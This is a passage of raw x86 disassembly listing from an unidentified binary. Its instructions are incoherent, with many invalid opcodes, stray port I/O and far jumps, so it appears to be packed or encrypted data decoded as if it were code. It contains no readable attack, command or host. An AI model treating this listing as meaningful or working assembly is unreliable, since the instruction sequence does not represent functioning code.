  418941:	add    BYTE PTR [ebx-0x11b6e1b8],0xaa
  418948:	out    0x6a,eax
  41894a:	icebp  
  41894b:	pop    ss
  41894c:	into   
  41894d:	test   BYTE PTR [edx-0xed57e9b],al
  418953:	sub    al,0xcf
  418955:	add    esi,DWORD PTR [esi+0x391c48cb]
  41895b:	outs   dx,DWORD PTR ds:[esi]
  41895c:	ror    BYTE PTR [ebx+0x3af2914f],1
  418962:	xor    BYTE PTR [eax-0x4c],ch
  418965:	xchg   ebx,eax
  418966:	mov    bh,bl
  418968:	jb     0x418923
  41896a:	xor    ebx,0xd11c1439
  418970:	jg     0x418935
  418972:	add    dh,al
  418974:	out    0xea,al
  418976:	pop    edi
  418977:	adc    bl,BYTE PTR [eax]
  418979:	cmp    al,0xf5
  41897b:	out    dx,al
  41897c:	ss cwde 
  41897e:	sub    al,0xba
  418980:	div    DWORD PTR [ebx+0x62]
  418983:	mov    edx,0xc40f63ef
  418988:	fstp   TBYTE PTR [edi+ebp*8+0x3d]
  41898c:	ficom  DWORD PTR [edi]
  41898e:	out    0x9e,eax
  418990:	jl     0x418967
  418992:	xchg   ebp,eax
  418993:	into   
  418994:	inc    esp
  418995:	hlt    
  418996:	mov    ecx,0x9a38a5ba
  41899b:	add    al,0x9
  41899d:	adc    cl,BYTE PTR [esp+eiz*8-0x28]
  4189a1:	std    
  4189a2:	cs data16 jl 0x418a03
  4189a6:	pusha  
  4189a7:	mov    ds:0x3a6efeff,al
  4189ac:	or     eax,0xc89a7e85
  4189b1:	pop    edi
  4189b2:	into   
  4189b3:	push   edi
  4189b4:	sub    DWORD PTR [edi+0x5c],ebx
  4189b7:	js     0x418a10
  4189b9:	cmovns esp,ebx
  4189bc:	aad    0x7
  4189be:	out    0x6,eax
  4189c0:	popf   
  4189c1:	cmp    eax,0x839df3a9
  4189c6:	sti    
  4189c7:	sbb    eax,DWORD PTR [edi]
  4189c9:	cmp    BYTE PTR [ecx+0x42],0x6
  4189cd:	fdiv   DWORD PTR [ebp+0x36e8cc44]
  4189d3:	mov    bl,0x22
  4189d5:	aam    0x14
  4189d7:	in     al,dx
  4189d8:	loop   0x4189cf
  4189da:	jbe    0x418a3a
  4189dc:	sbb    DWORD PTR [ecx],0x44
  4189df:	sbb    al,BYTE PTR [ebp-0x5244207]
  4189e5:	in     eax,0xf3
  4189e7:	adc    al,0xae
  4189e9:	in     al,0x81
  4189eb:	adc    eax,0xaf545804
  4189f0:	xchg   ebx,eax
  4189f1:	adc    eax,0x3e3c9a3a
  4189f6:	adc    dl,0x1d
  4189f9:	(bad)  
  4189fa:	(bad)  
  4189fb:	cli    
  4189fc:	dec    ecx
  4189fd:	add    eax,0xbf0ace99
  418a02:	sbb    ebp,DWORD PTR [edi+0x7a]
  418a05:	scas   al,BYTE PTR es:[edi]
  418a06:	xchg   DWORD PTR [esi],ecx
  418a08:	scas   eax,DWORD PTR es:[edi]
  418a09:	mov    eax,0x30edfeae
  418a0e:	push   0x4e
  418a10:	sub    eax,DWORD PTR [edi]
  418a12:	int3   
  418a13:	mov    bh,0x48
  418a15:	jmp    0x418a33
  418a17:	cdq    
  418a18:	(bad)  
  418a19:	pop    edx
  418a1a:	mov    edx,0xe1d35402
  418a1f:	jmp    0xcff76bfb
  418a24:	ret    0x4909
  418a27:	loope  0x418a41
  418a29:	stc    
  418a2a:	push   0x835faf9a
  418a2f:	jns    0x418a59
  418a31:	inc    esp
  418a32:	xlat   BYTE PTR ds:[ebx]
  418a33:	cmp    ebp,eax
  418a35:	aad    0xc2
  418a37:	dec    ebx
  418a38:	xor    ebp,DWORD PTR [ebp-0x7314f387]
  418a3e:	(bad)  
  418a3f:	and    ah,BYTE PTR [edi+0x4f1d325e]
  418a45:	add    eax,0xcde656e4
  418a4a:	inc    ebx
  418a4b:	(bad)  
  418a4c:	dec    edi
  418a4d:	dec    esi
  418a4e:	(bad)  
  418a4f:	dec    edi
  418a50:	repz iret 
  418a52:	cdq    
  418a53:	xor    eax,0xbeadfb9b
  418a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a59:	test   DWORD PTR fs:[ecx-0x4],edi
  418a5d:	xchg   di,ax
  418a5f:	not    bh
  418a61:	and    ah,dh
  418a63:	mov    ch,BYTE PTR [ebx]
  418a65:	xchg   ebp,eax
  418a66:	scas   al,BYTE PTR es:[edi]
  418a67:	xchg   esp,eax
  418a68:	gs retf 
  418a6a:	icebp  
  418a6b:	jb     0x418aba
  418a6d:	out    0x4e,eax
  418a6f:	fs jp  0x418a9f
  418a72:	test   DWORD PTR [edx+0x79],edx
  418a75:	jl     0x418aeb
  418a77:	mov    DWORD PTR [ebp-0x60],ecx
  418a7a:	(bad)  
  418a7b:	pop    ss
  418a7c:	dec    ecx
  418a7d:	mov    bh,0xa9
  418a7f:	(bad)  
  418a80:	lods   eax,DWORD PTR ds:[esi]
  418a81:	xchg   BYTE PTR [ebx-0x45d5ae00],bh
  418a87:	adc    eax,0xf8557f72
  418a8c:	mov    dh,ch
  418a8e:	or     ch,BYTE PTR [eax-0x7f]
  418a91:	sahf   
  418a92:	ss pop edx
  418a94:	pusha  
  418a95:	push   cs
  418a96:	or     al,0xe4
  418a98:	cmp    eax,0x8278441
  418a9d:	mov    dl,ah
  418a9f:	and    ecx,DWORD PTR [edx+0x21]
  418aa2:	nop
  418aa3:	mov    edx,?
  418aa5:	popa   
  418aa6:	cdq    
  418aa7:	and    al,0xd6
  418aa9:	push   ss
  418aaa:	ins    DWORD PTR es:[edi],dx
  418aab:	(bad)  
  418aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aad:	aas    
  418aae:	adc    DWORD PTR [edi-0x2a3820b2],esp
  418ab4:	(bad)  
  418ab6:	and    ch,BYTE PTR [eax+0x15a6ba3c]
  418abc:	mov    eax,0xd44f436f
  418ac1:	mov    ebp,DWORD PTR [edx-0x21baf935]
  418ac7:	popf   
  418ac8:	ret    0x2b5
  418acb:	adc    ah,BYTE PTR [edi+0x4e7f21eb]
  418ad1:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  418ad3:	test   al,0xf0
  418ad5:	sbb    DWORD PTR [ebx-0x69],ecx
  418ad8:	bound  eax,QWORD PTR [esi]
  418ada:	add    eax,eax
  418adc:	mov    eax,ds:0xa4fa9a09
  418ae1:	mov    WORD PTR [ebx+0x3932b395],gs
  418ae7:	call   0xfb1b5e49
  418aec:	mov    esi,0x759d3542
  418af1:	ss xor bh,ah
  418af4:	data16 mov bl,0xe2
  418af7:	sub    eax,0x8f3c97a7
  418afc:	dec    esp
  418afd:	les    ebp,FWORD PTR [ebx]
  418aff:	pop    ds
  418b00:	inc    ebp
  418b01:	push   cs
  418b02:	xchg   BYTE PTR [ecx],ah
  418b04:	xchg   ebx,eax
  418b05:	aad    0xc
  418b07:	push   ebx
  418b08:	and    bl,0xb8
  418b0b:	loopne 0x418b7d
  418b0d:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b0f:	mov    ebp,0xbd64ee71
  418b14:	push   esi
  418b15:	add    dh,ch
  418b17:	stos   BYTE PTR es:[edi],al
  418b18:	or     eax,0xeda877a6
  418b1d:	sub    ebx,DWORD PTR [edx-0x441411fa]
  418b23:	jge    0x418b3c
  418b25:	xchg   ebx,eax
  418b26:	cmp    edi,esi
  418b28:	stc    
  418b29:	sub    dh,dl
  418b2b:	scas   al,BYTE PTR es:[edi]
  418b2c:	fdiv   QWORD PTR [esi-0x7f]
  418b2f:	push   esp
  418b30:	fnsave [esi+0x688e087b]
  418b36:	mov    dl,0x99
  418b38:	int3   
  418b39:	aaa    
  418b3a:	daa    
  418b3b:	cmp    eax,0x770b835c
  418b40:	cmp    cl,al
  418b42:	das    
  418b43:	lods   eax,DWORD PTR ds:[esi]
  418b44:	call   0xc49:0x98fc47d4
  418b4b:	mov    es,WORD PTR [edx-0x7e]
  418b4e:	cmovae esi,DWORD PTR [ecx-0x2c]
  418b52:	shl    DWORD PTR [edx-0x62704f9e],1
  418b58:	adc    ebx,DWORD PTR [esi]
  418b5a:	jnp    0x418b68
  418b5c:	xchg   edx,eax
  418b5d:	in     eax,dx
  418b5e:	xor    DWORD PTR ds:0xfe71cdc1,ebp
  418b64:	push   eax
  418b65:	daa    
  418b66:	in     eax,dx
  418b67:	push   ss
  418b68:	into   
  418b69:	mov    ecx,0x9b150669
  418b6e:	sbb    dl,bl
  418b70:	scas   eax,DWORD PTR es:[edi]
  418b71:	xchg   DWORD PTR [esi+0x5d00d18],edx
  418b77:	push   0x94f78f53
  418b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b7d:	inc    esp
  418b7e:	cmp    ch,BYTE PTR [edx+0x56]
  418b81:	jno    0x418b67
  418b83:	cmp    BYTE PTR [esi+ecx*8+0x3c7203f0],dl
  418b8a:	inc    ebp
  418b8b:	dec    BYTE PTR [edi+0x5698109]
  418b91:	sub    al,0x60
  418b93:	(bad)  
  418b94:	not    ah
  418b96:	aas    
  418b97:	mov    ah,0x77
  418b99:	stos   BYTE PTR es:[edi],al
  418b9a:	cmp    ebp,DWORD PTR [edi-0x4d23b0b]
  418ba0:	jns    0x418bbe
  418ba2:	retf   0xc5b
  418ba5:	das    
  418ba6:	jbe    0x418baf
  418ba8:	(bad)  
  418baa:	pop    ds
  418bab:	mov    edi,0x7cd0968a
  418bb0:	sub    DWORD PTR [edx-0x45],eax
  418bb3:	mov    edx,0x81249f8d
  418bb8:	sbb    ebp,0x25
  418bbb:	cmc    
  418bbc:	rcl    BYTE PTR ds:0xe2b93a99,cl
  418bc2:	lods   eax,DWORD PTR ds:[esi]
  418bc3:	mov    cl,0xc6
  418bc5:	clc    
  418bc6:	pop    ds
  418bc7:	in     eax,0xff
  418bc9:	call   0xbe5251ba
  418bce:	test   al,0xc4
  418bd0:	imul   edi
  418bd2:	jno    0x418c49
  418bd4:	sub    DWORD PTR [esi+0x3f],esi
  418bd7:	arpl   si,bx
  418bd9:	jecxz  0x418c44
  418bdb:	scas   al,BYTE PTR es:[edi]
  418bdc:	imul   ebp,DWORD PTR [ecx],0x17
  418bdf:	neg    BYTE PTR [ecx]
  418be1:	nop
  418be2:	mov    ch,0xb3
  418be4:	mov    al,ds:0xbdc8abe1
  418be9:	fs pushf 
  418beb:	push   ebp
  418bec:	fcmovb st,st(4)
  418bee:	and    eax,0x9910c78e
  418bf3:	jno    0x418b93
  418bf5:	sub    BYTE PTR [esp+ebp*1+0x20],bl
  418bf9:	xchg   ecx,eax
  418bfa:	ds je  0x418c77
  418bfd:	xor    eax,0xa34d42d
  418c02:	dec    ebx
  418c03:	fldz   
  418c05:	jmp    0x418b8c
  418c07:	xor    al,ah
  418c09:	inc    ecx
  418c0a:	cmp    BYTE PTR [edi+0x7e72e13],al
  418c10:	mov    edx,0x59092be5
  418c15:	mov    ch,0x49
  418c17:	loope  0x418c40
  418c19:	mov    eax,DWORD PTR [ebx+0x2434e487]
  418c1f:	jp     0x418c81
  418c21:	push   edx
  418c22:	xchg   esi,eax
  418c23:	ds xchg esp,eax
  418c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c26:	(bad)  
  418c27:	xlat   BYTE PTR ds:[ebx]
  418c28:	es out dx,eax
  418c2a:	pushf  
  418c2b:	add    edx,esi
  418c2d:	push   eax
  418c2e:	jg     0x418bdf
  418c30:	xchg   esp,eax
  418c31:	cdq    
  418c32:	and    edx,DWORD PTR [esi-0x3a04aebd]
  418c38:	or     al,0x7
  418c3a:	ss pop ss
  418c3c:	cmc    
  418c3d:	mov    al,bh
  418c3f:	mov    esp,0x761a6043
  418c44:	sbb    DWORD PTR [edx+0x49],edi
  418c47:	int3   
  418c48:	add    DWORD PTR ds:0x9d9c3365,ebp
  418c4e:	(bad)  
  418c50:	je     0x418c96
  418c52:	jle    0x418cc8
  418c54:	ss inc dh
  418c57:	dec    ecx
  418c58:	or     DWORD PTR [eax+eiz*8-0x65],0x2d
  418c5d:	mov    bh,0x76
  418c5f:	leave  
  418c60:	dec    ebp
  418c61:	int    0xa2
  418c63:	adc    eax,0xc246623d
  418c68:	mov    ch,BYTE PTR [esp+ebx*2]
  418c6b:	mov    ds:0xce6ea86f,eax
  418c70:	rcr    BYTE PTR [esi],1
  418c72:	cmp    eax,0x76898e6d
  418c77:	or     edx,DWORD PTR [bx+si]
  418c7a:	hlt    
  418c7b:	fbld   TBYTE PTR [ebp+0x43df2240]
  418c81:	mov    bh,BYTE PTR [ecx]
  418c83:	push   ecx
  418c84:	int    0x68
  418c86:	cmp    al,0x7f
  418c88:	in     al,dx
  418c89:	arpl   WORD PTR [edx-0x2a],dx
  418c8c:	aaa    
  418c8d:	mov    ds:0x6384cf00,al
  418c92:	test   al,bl
  418c94:	mov    ds:0x6989,eax
	...
  418d11:	add    BYTE PTR [eax],al
  418d13:	add    bl,ah
  418d15:	pop    ds
  418d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d17:	adc    al,0xfe
  418d19:	mov    ebp,0x9faffff3
  418d1e:	test   ah,0xa8
  418d21:	push   eax
  418d22:	ss hlt 
  418d24:	jb     0x418d54
  418d26:	add    DWORD PTR [eax],eax
  418d28:	imul   eax,DWORD PTR [edi],0x0
  418d2b:	add    BYTE PTR [ebx],dh
  418d2d:	aad    0xb9
  418d2f:	stos   BYTE PTR es:[edi],al
  418d30:	nop
  418d31:	xchg   ebp,eax
  418d32:	xchg   esi,eax
  418d33:	ficomp WORD PTR [eax+0x34c900b5]
  418d39:	int3   
  418d3a:	mov    BYTE PTR [ecx-0x7f],0x1d
  418d3e:	xchg   DWORD PTR ss:[eax+0xbe88f11],eax
  418d45:	xor    cl,bl
  418d47:	(bad)  
  418d48:	mov    BYTE PTR [edx+0x15],dl
  418d4b:	sahf   
  418d4c:	call   0x52c8:0xdea054c8
  418d53:	pop    esp
  418d54:	xor    BYTE PTR es:[edx-0x4],al
  418d58:	dec    ebp
  418d59:	cmp    BYTE PTR [ecx+0x7a],al
  418d5c:	push   esp
  418d5d:	ins    DWORD PTR es:[edi],dx
  418d5e:	icebp  
  418d5f:	popa   
  418d60:	lods   al,BYTE PTR ds:[esi]
  418d61:	pop    ds
  418d62:	in     eax,dx
  418d63:	cwde   
  418d64:	loopne 0x418d19
  418d66:	adc    bl,BYTE PTR [ebx+0x5299b706]
  418d6c:	addr16 dec ecx
  418d6e:	push   ss
  418d6f:	or     eax,0xe44cee89
  418d74:	pop    eax
  418d75:	pop    ecx
  418d76:	jno    0x418cf8
  418d78:	inc    esp
  418d79:	sbb    BYTE PTR [ebp+0x5e547abf],dl
  418d7f:	mov    cl,0x54
  418d81:	icebp  
  418d82:	add    DWORD PTR [edx-0x5d],esi
  418d85:	pop    ebp
  418d86:	jl     0x418deb
  418d88:	mov    cs,WORD PTR [ecx]
  418d8a:	jp     0x418e01
  418d8c:	into   
  418d8d:	mov    dl,0xe3
  418d8f:	ja     0x418d5c
  418d91:	mov    edx,edx
  418d93:	sub    DWORD PTR [esi-0x28],edi
  418d96:	adc    BYTE PTR [esi],bl
  418d98:	xchg   DWORD PTR [edi+0x4e1dc243],eax
  418d9e:	in     eax,dx
  418d9f:	or     al,0xdb
  418da1:	pop    ebx
  418da2:	adc    ebp,edi
  418da4:	xchg   esi,eax
  418da5:	cmc    
  418da6:	mov    ecx,0xc69a1376
  418dab:	push   edx
  418dac:	lahf   
  418dad:	vcvtsi2ss xmm1,xmm1,DWORD PTR [eax]
  418db1:	popf   
  418db2:	imul   edx,DWORD PTR [ebx-0x2dc59e84],0xd373ac9d
  418dbc:	xchg   ebx,eax
  418dbd:	mov    BYTE PTR [ecx+0x2e],ch
  418dc0:	sub    ch,ch
  418dc2:	std    
  418dc3:	cmp    esi,edi
  418dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dc6:	(bad)  
  418dc8:	gs lahf 
  418dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dcb:	icebp  
  418dcc:	nop
  418dcd:	into   
  418dce:	jmp    0xfd5d889
  418dd3:	nop
  418dd4:	jno    0x418df8
  418dd6:	jmp    0x36be:0xbe8b144f
  418ddd:	xchg   esp,eax
  418dde:	leave  
  418ddf:	retf   
  418de0:	ret    0xe351
  418de3:	dec    eax
  418de4:	stc    
  418de5:	rcl    BYTE PTR [ecx+0x42],1
  418de8:	inc    edi
  418de9:	jmp    0x90f7849a
  418dee:	cmp    ch,ah
  418df0:	jg     0x418e49
  418df2:	inc    esp
  418df3:	mov    al,0xdc
  418df5:	dec    edi
  418df6:	mov    ?,WORD PTR [edi-0x55e6dc3f]
  418dfc:	inc    BYTE PTR [ecx+0x3c97e763]
  418e02:	and    BYTE PTR [ebp-0xd],0xbb
  418e06:	rol    BYTE PTR [edi+0x79],0xf0
  418e0a:	mov    ss,esp
  418e0c:	dec    edi
  418e0d:	sbb    DWORD PTR [edx],ecx
  418e0f:	test   al,0x41
  418e11:	ret    0x91c0
  418e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e15:	mov    bh,0xe3
  418e17:	loop   0x418dbe
  418e19:	or     al,0xed
  418e1b:	lods   eax,DWORD PTR ds:[esi]
  418e1c:	iret   
  418e1d:	aaa    
  418e1e:	ret    
  418e1f:	add    cl,0x2
  418e22:	pop    ss
  418e23:	loope  0x418e54
  418e25:	add    eax,0xd1d64537
  418e2a:	mov    eax,0x377e3944
  418e2f:	xor    DWORD PTR [ebp+0x28],eax
  418e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e33:	mov    bl,0x3c
  418e35:	adc    edi,DWORD PTR [eax]
  418e37:	data16 (bad) 
  418e39:	rol    BYTE PTR [esi],0x87
  418e3c:	xchg   edi,eax
  418e3d:	imul   eax,esi,0x21
  418e40:	push   ebx
  418e41:	jmp    0x418e42
  418e43:	dec    esi
  418e44:	jmp    0x55e:0xc270f128
  418e4b:	shl    ch,cl
  418e4d:	jle    0x418e01
  418e4f:	dec    esp
  418e50:	jecxz  0x418e52
  418e52:	hlt    
  418e53:	(bad)  [eax+0x39d08780]
  418e59:	rol    BYTE PTR [edi+0x57],cl
  418e5c:	arpl   WORD PTR [edi+edx*8+0x7ba6862b],ax
  418e63:	mov    ah,0x35
  418e65:	cld    
  418e66:	ror    ah,0x6d
  418e69:	push   esi
  418e6a:	jecxz  0x418e60
  418e6c:	cmp    al,0x8f
  418e6e:	adc    eax,0x6069ad9f
  418e73:	ja     0x418e0e
  418e75:	jp     0x418eb4
  418e77:	jnp    0x418ec9
  418e79:	push   edx
  418e7a:	jnp    0x418ec5
  418e7c:	pop    ecx
  418e7d:	js     0x418ef6
  418e7f:	sub    esi,esp
  418e81:	sti    
  418e82:	mov    edx,0x6d0ea697
  418e87:	outs   dx,DWORD PTR ds:[esi]
  418e88:	aaa    
  418e89:	aam    0xdc
  418e8b:	sti    
  418e8c:	adc    edx,DWORD PTR [edi-0x12d4d97f]
  418e92:	mov    ds:0xe20fa792,al
  418e97:	mov    edi,0xece58815
  418e9c:	dec    ecx
  418e9d:	into   
  418e9e:	test   DWORD PTR [edi+ebx*8-0x36],0xbd4af8e6
  418ea6:	xchg   DWORD PTR [eiz*1+0xf3fde91],esp
  418ead:	iret   
  418eae:	(bad)  
  418eb0:	sub    BYTE PTR [edx+0x37],dh
  418eb3:	fistp  DWORD PTR [ecx+0x72]
  418eb6:	pop    es
  418eb7:	cld    
  418eb8:	xchg   ecx,eax
  418eb9:	dec    esp
  418eba:	in     al,dx
  418ebb:	(bad)  
  418ebc:	xchg   esp,eax
  418ebd:	and    BYTE PTR [eax+0x29],0x5f
  418ec1:	push   cs
  418ec2:	or     bh,bh
  418ec4:	dec    ecx
  418ec5:	(bad)
  418ec8:	jmp    ecx
  418eca:	inc    edx
  418ecb:	mov    ds:0x73bbaa9,al
  418ed0:	jne    0x418f37
  418ed2:	dec    eax
  418ed3:	add    eax,0xa3d338db
  418ed8:	fidivr DWORD PTR [ebp+0x576de9f7]
  418ede:	fs aas 
  418ee0:	mul    DWORD PTR [ebx]
  418ee2:	push   eax
  418ee3:	xor    BYTE PTR [edx+0x27],cl
  418ee6:	xchg   DWORD PTR [edx+eax*1+0x39],eax
  418eea:	mov    ds:0x374b8b5d,al
  418eef:	test   eax,0x57402663
  418ef4:	call   0x4150:0x7c521582
  418efb:	pop    ds
  418efc:	test   DWORD PTR [ecx+0x7555b7cd],eax
  418f02:	std    
  418f03:	jmp    0x418f32
  418f05:	add    BYTE PTR [edx-0x31],0xac
  418f09:	jo     0x418ed0
  418f0b:	add    bh,ch
  418f0d:	ret    
  418f0e:	shl    BYTE PTR [esi],1
  418f10:	and    DWORD PTR [ebp-0x79f5cc25],edi
  418f16:	call   0xf3e4:0xcceced67
  418f1d:	mov    esi,DWORD PTR [ebx]
  418f1f:	loope  0x418f4c
  418f21:	sbb    ch,al
  418f23:	dec    ebx
  418f24:	into   
  418f25:	test   ebp,edx
  418f27:	mov    al,BYTE PTR [edi]
  418f29:	loop   0x418ec0
  418f2b:	js     0x418f4d
  418f2d:	mov    esi,0x4457c79d
  418f32:	mov    edx,0x9d81299
  418f37:	ds (bad) 
  418f39:	sbb    BYTE PTR [ecx+0x6fa124fd],dl
  418f3f:	adc    al,0xc0
  418f41:	(bad)  
  418f42:	ror    BYTE PTR [ebp-0x65187d66],1
  418f48:	xchg   ebp,eax
  418f49:	mov    al,ds:0x51845d5b
  418f4e:	test   al,0x92
  418f50:	add    DWORD PTR [edx+0x7a],esp
  418f53:	inc    esi
  418f54:	je     0x418ef4
  418f56:	lds    edi,FWORD PTR [esp+esi*8+0x4d]
  418f5a:	or     al,0xb5
  418f5c:	add    eax,0x45616542
  418f61:	jne    0x418f7d
  418f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f64:	jmp    FWORD PTR [eax+0xe]
  418f67:	stos   DWORD PTR es:[edi],eax
  418f68:	push   ebp
  418f69:	test   eax,0x7327416d
  418f6e:	(bad)  [esi+eiz*1+0x48a7edee]
  418f75:	adc    al,0x52
  418f77:	retf   
  418f78:	inc    eax
  418f79:	sub    BYTE PTR [ebp-0x6a],ah
  418f7c:	dec    ebp
  418f7d:	and    al,0x8d
  418f7f:	(bad)  
  418f80:	stc    
  418f81:	jns    0x418fcc
  418f83:	retf   
  418f84:	mov    ds:0x272b24a8,al
  418f89:	cmovae esi,DWORD PTR [edx+0x41]
  418f8d:	lods   eax,DWORD PTR ds:[esi]
  418f8e:	cmp    ecx,ebx
  418f90:	xchg   ebx,eax
  418f91:	mov    ds:0x2c926300,al
  418f96:	mov    ebp,0x928d071a
  418f9b:	mov    es,WORD PTR [esi]
  418f9d:	sub    bl,BYTE PTR [eax-0x615348cb]
  418fa3:	jb     0x418f6c
  418fa5:	push   esi
  418fa6:	stos   DWORD PTR es:[edi],eax
  418fa7:	mov    ecx,0x3a2f6ea7
  418fac:	cli    
  418fad:	jecxz  0x418ff7
  418faf:	push   ebp
  418fb0:	inc    edx
  418fb1:	and    eax,0x7e87872f
  418fb6:	jge    0x418fb3
  418fb8:	stc    
  418fb9:	mov    cl,0x9
  418fbb:	dec    ebx
  418fbc:	sub    al,0x7d
  418fbe:	or     al,0x3c
  418fc0:	enter  0x95d,0xf5
  418fc4:	imul   eax,DWORD PTR [edx+0x508b37a7],0xfffffff8
  418fcb:	mov    al,0xbd
  418fcd:	cwde   
  418fce:	scas   al,BYTE PTR es:[edi]
  418fcf:	push   ecx
  418fd0:	cmp    eax,0xbe0ff9d0
  418fd5:	mov    ah,0x64
  418fd7:	cli    
  418fd8:	jmp    0x58b4:0x12485858
  418fdf:	imul   DWORD PTR [eax+0x2d92e799]
  418fe5:	add    BYTE PTR [esi+0x5f],al
  418fe8:	test   eax,0x58b29ec4
  418fed:	in     eax,0x3f
  418fef:	and    DWORD PTR [edx-0x1f],ecx
  418ff2:	(bad)  
  418ff3:	push   edi
  418ff4:	xchg   ebx,eax
  418ff5:	out    dx,eax
  418ff6:	ins    BYTE PTR es:[edi],dx
  418ff7:	mov    esp,0x14a4a9ab
  418ffc:	enter  0xe5fe,0xb
  419000:	mov    esi,DWORD PTR [eax+0x2d1e95d9]
  419006:	stos   DWORD PTR es:[edi],eax
  419007:	out    dx,al
  419008:	xchg   ecx,eax
  419009:	jbe    0x418fc9
  41900b:	jmp    0x41905f
  41900d:	sti    
  41900e:	sub    DWORD PTR [ebx+0x68d2886e],edx
  419014:	mov    ch,0x55
  419016:	push   ds
  419017:	adc    al,0x35
  419019:	ss scas al,BYTE PTR es:[edi]
  41901b:	(bad)  
  41901c:	jb     0x41906f
  41901e:	and    al,0x7c
  419020:	(bad)  
  419021:	mov    ebx,0xd98c6d2b
  419026:	xlat   BYTE PTR ds:[ebx]
  419027:	add    al,0x17
  419029:	jb     0x419094
  41902b:	sub    bl,cl
  41902d:	mov    ?,WORD PTR [edi+edi*4-0x60681cdb]
  419034:	inc    edx
  419035:	mov    edx,0x4f937965
  41903a:	js     0x418feb
  41903c:	out    dx,al
  41903d:	mov    edx,0x37655903
  419042:	cmc    
  419043:	jmp    DWORD PTR [esi+0x37]
  419046:	ins    BYTE PTR es:[edi],dx
  419047:	jmp    0xcef3:0xe5503e76
  41904e:	ins    BYTE PTR es:[edi],dx
  41904f:	daa    
  419050:	mov    bl,BYTE PTR [esi*4+0x3b45f43a]
  419057:	jl     0x4190d2
  419059:	(bad)  
  41905a:	fadd   DWORD PTR [eax+0x2ab42364]
  419060:	xlat   BYTE PTR ds:[ebx]
  419061:	mov    dl,0xb9
  419063:	push   eax
  419064:	icebp  
  419065:	shl    DWORD PTR [edi+ecx*1],1
  419068:	jmp    0x37bb682b
  41906d:	pop    ebp
  41906e:	jle    0x419052
  419070:	retf   0xe92b
  419073:	mov    ds:0x998dc5d6,al
  419078:	cli    
  419079:	hlt    
  41907a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41907b:	out    0xdf,eax
  41907d:	inc    eax
  41907e:	dec    edx
  41907f:	in     al,0x2a
  419081:	(bad)  
  419082:	jno    0x419095
  419084:	and    DWORD PTR [edx-0x6c5a02c8],edi
  41908a:	(bad)  
  41908c:	push   DWORD PTR [ebx+0x12]
  41908f:	nop
  419090:	adc    bl,BYTE PTR [edx+0x44]
  419093:	hlt    
  419094:	in     al,dx
  419095:	cmp    al,BYTE PTR [edx+esi*2]
  419098:	xor    ch,cl
  41909a:	mov    edx,0x36b577fc
  41909f:	jne    0x41905b
  4190a1:	adc    BYTE PTR [ebp-0x60],dh
  4190a4:	stos   BYTE PTR es:[edi],al
  4190a5:	lds    esp,FWORD PTR [esi]
  4190a7:	daa    
  4190a8:	jb     0x41902b
  4190aa:	aas    
  4190ab:	jns    0x4190a3
  4190ad:	retf   0x6aad
  4190b0:	int    0xfa
  4190b2:	adc    BYTE PTR [ebx],dl
  4190b4:	cli    
  4190b5:	gs jo  0x419107
  4190b8:	or     DWORD PTR [ebx],eax
  4190ba:	pop    edx
  4190bb:	push   es
  4190bc:	add    DWORD PTR [ecx-0x11ca1514],edx
  4190c2:	aam    0xf1
  4190c4:	in     eax,dx
  4190c5:	add    ecx,DWORD PTR [esi+ebx*2]
  4190c8:	scas   al,BYTE PTR es:[edi]
  4190c9:	sub    ch,cl
  4190cb:	fcomp  QWORD PTR fs:0xad547705
  4190d2:	jmp    0xd1395d1e
  4190d7:	adc    al,0x1f
  4190d9:	sbb    eax,0xb2d3c5e3
  4190de:	sti    
  4190df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190e0:	cli    
  4190e1:	xchg   esp,eax
  4190e2:	jbe    0x41912f
  4190e4:	fidivr WORD PTR [esi+esi*1]
  4190e7:	inc    eax
  4190e8:	arpl   WORD PTR [edi-0x24bd2caa],ax
  4190ee:	add    BYTE PTR [esp+ebp*8+0x2a70c7d4],ch
  4190f5:	arpl   dx,dx
  4190f7:	ss jnp 0x4190b2
  4190fa:	cmp    eax,0xc4db9936
  4190ff:	out    dx,eax
  419100:	cmp    esi,DWORD PTR [edi-0x1b1c845d]
  419106:	faddp  st(3),st
  419108:	mov    al,0x24
  41910a:	xchg   ebp,eax
  41910b:	mov    eax,ds:0x3aae6c95
  419110:	sahf   
  419111:	dec    edx
  419112:	adc    DWORD PTR [ecx+0x33625e5c],edx
  419118:	out    dx,eax
  419119:	retf   0x394a
  41911c:	scas   al,BYTE PTR es:[edi]
  41911d:	stc    
  41911e:	out    dx,al
  41911f:	stos   BYTE PTR es:[edi],al
  419120:	aaa    
  419121:	cmp    al,0x57
  419123:	fild   WORD PTR [edi-0x3a]
  419126:	cmp    al,0xf8
  419128:	xor    DWORD PTR [edi+0x13],esi
  41912b:	dec    edx
  41912c:	call   0x19f0:0x28ee1d4a
  419133:	ds inc esi
  419135:	js     0x4190ce
  419137:	jp     0x419168
  419139:	pop    eax
  41913a:	test   DWORD PTR [edi],esi
  41913c:	in     eax,0xca
  41913e:	jbe    0x41918b
  419140:	adc    DWORD PTR [edx+0x6c],edi
  419143:	arpl   WORD PTR [ebx+0x3dcd1762],cx
  419149:	loopne 0x41913b
  41914b:	test   eax,0xf5b7cc7d
  419150:	das    
  419151:	push   0x9af5a6f8
  419156:	mov    bl,0x53
  419158:	mov    al,ds:0xacec152a
  41915d:	adc    al,0x68
  41915f:	outs   dx,DWORD PTR ds:[esi]
  419160:	loopne 0x419155
  419162:	push   bx
  419164:	sti    
  419165:	popa   
  419166:	lea    ebp,[edi-0x440db57c]
  41916c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41916d:	jle    0x419141
  41916f:	enter  0xec1c,0x1b
  419173:	sub    al,0xa2
  419175:	jp     0x4190fd
  419177:	pop    ebx
